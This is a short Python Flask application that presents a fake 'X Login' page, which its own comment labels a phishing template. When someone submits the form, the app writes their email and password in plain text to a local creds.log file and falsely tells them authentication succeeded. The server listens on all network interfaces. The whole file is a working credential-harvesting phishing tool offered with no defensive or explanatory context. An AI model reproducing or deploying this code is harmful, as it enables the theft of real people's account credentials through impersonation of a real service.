import os
import flask
from flask import Flask, request, render_template_string

# Load environment variables
SECRET_KEY = os.environ.get('SECRET_KEY', 'dev-key')
PORT = int(os.environ.get('PORT', 8080))

app = Flask(__name__)
app.secret_key = SECRET_KEY

# X.com phishing template
X_PHISHING_TEMPLATE = '''
<html>
<head><title>X Login</title></head>
<body>
<h2>Welcome to X</h2>
<form action="/x-auth" method="post">
<input type="email" name="email" placeholder="Email" required><br>
<input type="password" name="password" placeholder="Password" required><br>
<button type="submit">Continue</button>
</form>
</body>
</html>
'''

@app.route('/')
def index():
    return render_template_string(X_PHISHING_TEMPLATE)

@app.route('/x-auth', methods=['POST'])
def authenticate():
    email = request.form['email']
    password = request.form['password']
    
    # Log credentials
    with open('creds.log', 'a') as f:
        f.write(f"{email}:{password}\n")
    
    return "Authentication successful"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=PORT)
